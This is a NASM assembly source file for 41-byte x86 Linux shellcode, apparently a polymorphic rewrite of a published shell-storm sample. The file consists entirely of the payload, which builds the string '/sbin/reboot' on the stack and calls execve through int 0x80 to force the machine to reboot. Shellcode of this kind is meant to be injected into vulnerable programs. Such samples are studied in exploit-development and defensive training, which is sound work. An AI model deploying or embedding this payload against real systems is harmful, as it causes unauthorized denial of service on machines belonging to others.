; Filename: original.nasm
; Original Author: TheWorm
; Polymorphic Modification: d3c3pt10n (Kevin Kirsche)
; Original Website: http://shell-storm.org/shellcode/files/shellcode-477.php
; Date: 11/07/2009
; Size: 41 bytes

global _start

section .text
_start:
  push 0xb                         ; adjust the size of the stack
  pop eax
  xor edx, edx
  push edx                         ; null string terminator
  mov dword [esp-0x4], 0x746f6f62  ; toob
  mov dword [esp-0x8], 0x65722f6e  ; er/n
  mov dword [esp-0xc], 0x6962732f  ; ibs/
  sub esp, 0xc
  mov ebx, esp                     ; move a pointer to our string into EBX
  push edx                         ; NULL argument
  push ebx                         ; pointer to /sbin/reboot w/ null terminator argument
  mov ecx, esp                     ; move pointer to arguments into ECX
  int 0x80                         ; execve /sbin/reboot
